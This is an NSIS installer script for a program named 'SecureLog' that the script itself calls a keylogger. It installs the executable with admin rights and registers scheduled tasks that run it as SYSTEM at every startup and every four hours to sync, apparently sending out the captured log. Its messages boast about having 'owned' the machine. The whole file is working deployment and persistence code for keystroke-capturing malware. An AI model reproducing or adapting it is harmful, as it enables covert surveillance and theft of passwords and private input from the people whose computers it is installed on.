Name "SecureLog"
LoadLanguageFile "${NSISDIR}\Contrib\Language files\English.nlf"
OutFile "Setup.exe"
# Unicode true
SetCompress force
SetCompressor /FINAL /SOLID lzma
SetDatablockOptimize on
SetDateSave off
SetOverwrite on
CRCCheck force
AllowSkipFiles off
RequestExecutionLevel admin
WindowIcon off
SetFont "Tahoma" 8
InstallDir $PROGRAMFILES\SecureLog
InstallDirRegKey HKLM "Software\SecureLog" "Install_Dir"
Page instfiles
UninstPage uninstConfirm
UninstPage instfiles
UninstallCaption "SecureLog"
UninstallButtonText "Uninstall"
UninstallSubCaption 0 " [Uninstalling]"
UninstallSubCaption 1 " [Cleaning]"
UninstallSubCaption 2 " [Uninstall finished]"
UninstallText "Do you really want to remove SecureLog?" "Removing: "
AllowRootDirInstall false
# ManifestDPIAware true
MiscButtonText "Previous" "Next" "Cancel" "Close"
BGFont "Tahoma" height 12
Caption "SecureLog"
BrandingText "SecureLog - Keylogger"
CompletedText "All is done."
DetailsButtonText "Details"
FileErrorText "Error writing $\r$\n$0$\r$\nPlease retry.$\r$\nIf the problem persists please report it."
InstallColors 00ff00 000000
InstallButtonText "Install"
InstProgressFlags colored
ShowInstDetails show
ShowUninstDetails show
VIAddVersionKey /LANG=${LANG_ENGLISH} "ProductName" "SecureLog"
VIAddVersionKey /LANG=${LANG_ENGLISH} "CompanyName" "Man In The Middle"
VIAddVersionKey /LANG=${LANG_ENGLISH} "FileDescription" "A lazy keylogger"
VIAddVersionKey /LANG=${LANG_ENGLISH} "LegalTrademarks" "There is something legal about this if you don't pay attention."
VIAddVersionKey /LANG=${LANG_ENGLISH} "LegalCopyright" "No Copyright"
VIAddVersionKey /LANG=${LANG_ENGLISH} "FileVersion" "0.0.1"
VIProductVersion "0.0.0.1"
Function .onInit
	# Check if the installer is running already.
	# http://nsis.sourceforge.net/Allow_only_one_installer_instance
	System::Call 'kernel32::CreateMutex(i 0, i 0, t "SecureLogInstallation") ?e'
	Pop $R0
	StrCmp $R0 0 +3
		MessageBox MB_OK "The installer is already running."
	Abort
	MessageBox MB_YESNO "You're a bad boy aren't you?! Do you really want to install this thing?" IDYES gogogo
	Abort
	gogogo:
FunctionEnd
Function .onInstSuccess
	MessageBox MB_OK "Y0u'v3 0wn3d this w1nd0ws!"
	Exec $INSTDIR\securelog.exe
FunctionEnd
Function .onInstFailed
	MessageBox MB_OK "Seems like there was a problem here."
FunctionEnd
Function un.onUninstSuccess
	MessageBox MB_OK "We've cleaned this windows for you."
FunctionEnd
Function un.onUninstFailed
	MessageBox MB_OK "Seems like something went south while uninstalling."
FunctionEnd
Section "Install"
	SectionIn RO
	SetAutoClose true
	SetOutPath $INSTDIR
	File "securelog.exe"
	WriteRegStr HKLM SOFTWARE\securelog "Install_Dir" "$INSTDIR"
	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\securelog" "DisplayName" "SecureLog"
	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\securelog" "UninstallString" '"$INSTDIR\uninstall.exe"'
	WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\securelog" "NoModify" 1
	WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\securelog" "NoRepair" 1
	WriteUninstaller "uninstall.exe"
	# Send log every 4 hours
	Exec "schtasks /v1 /create /tn $\"SecureLogTimed$\" /sc hourly /mo 4 /TR $\"\$\"$INSTDIR\securelog.exe --sync\$\"$\"  /ru $\"System$\" /rp /RL HIGHEST /f"
	# Start securelog.exe at Windows Startup
	Exec "schtasks /v1 /create /tn $\"SecureLogStart$\" /sc onstart /TR $\"\$\"$INSTDIR\securelog.exe\$\"$\"  /ru $\"System$\" /rp /RL HIGHEST /f"
SectionEnd
Section "Uninstall"
	SetAutoClose true
	# Kill the bastard if it's still alive..
	Exec "taskkill /IM securelog.exe /F"
	# A lazy hack cause if the executable is running we can not delete its file..
	MessageBox MB_OK "We have to kill the keylogger first..$\r$\nThat's what the black window is for..$\r$\nPress OK when finished.."
	DeleteRegKey HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\securelog"
	DeleteRegKey HKLM SOFTWARE\securelog
	Delete $INSTDIR\*
	RMDir /R "$INSTDIR"
	# Remove scheduled tasks..
	Exec "schtasks /delete /tn SecureLogTimed /f"
	Exec "schtasks /delete /tn SecureLogStart /f"
SectionEnd